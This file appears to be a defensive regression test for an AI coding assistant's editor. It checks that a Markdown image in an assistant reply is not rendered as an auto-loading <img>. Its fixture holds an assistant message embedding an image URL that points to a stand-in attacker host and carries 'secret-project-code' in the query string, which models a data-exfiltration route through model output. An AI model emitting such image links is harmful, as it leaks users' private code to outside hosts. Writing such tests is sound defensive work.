import { afterAll, beforeAll, expect, test } from "bun:test";
import { GlobalRegistrator } from "@happy-dom/global-registrator";

// Reproducer for PR #136 review comment: assistant Markdown images render as
// <img> elements, which the browser fetches without any user interaction.
beforeAll(() => {
	GlobalRegistrator.register();
	(
		globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }
	).IS_REACT_ACT_ENVIRONMENT = true;
});
afterAll(() => GlobalRegistrator.unregister());

test("assistant Markdown image is not rendered as an auto-loading <img>", async () => {
	const { act } = await import("react");
	const { createRoot } = await import("react-dom/client");
	const { Editor } = await import("../src/components/bal-bot/editor");

	const leak = "https://attacker.example/?d=secret-project-code";
	const agent = {
		state: {
			messages: [
				{ role: "user", content: "summarise main.bal" },
				{
					role: "assistant",
					content: [{ type: "text", text: `Done. ![x](${leak})` }],
				},
			],
			isStreaming: false,
		},
		compactionState: "idle",
		subscribe: () => () => {},
		subscribeCompaction: () => () => {},
		abort: () => {},
	};
	const scope = {
		id: "scope-1",
		scopeKind: "function",
		name: "main",
		getFlowUI: () => new Promise(() => {}),
		getAgent: async () => agent,
	};
	const files = { "main.bal": "public function main() {}\n" };
	const analysis = { revision: 0 };
	const storage = { writable: true };
	const workspace = {
		projectName: "demo",
		subscribe: () => () => {},
		snapshot: () => files,
		subscribeStorage: () => () => {},
		storageSnapshot: () => storage,
		subscribeAnalysis: () => () => {},
		analysisSnapshot: () => analysis,
		getScopes: async () => [scope],
		list: () => Object.keys(files),
		write: () => {},
		remove: () => {},
	};

	const container = document.createElement("div");
	document.body.appendChild(container);
	const root = createRoot(container);
	await act(async () => {
		root.render(
			// biome-ignore lint/suspicious/noExplicitAny: minimal stub workspace
			<Editor workspace={workspace as any} />,
		);
	});
	// Let getScopes -> getAgent resolve and re-render.
	for (let i = 0; i < 5; i++) await act(async () => {});

	const body = container.querySelector("article.message.assistant");
	expect(body?.textContent).toContain("Done.");
	const images = [...container.querySelectorAll("article.message img")].map(
		(img) => img.getAttribute("src"),
	);
	expect(images).not.toContain(leak);

	await act(async () => root.unmount());
	container.remove();
}, 30000);
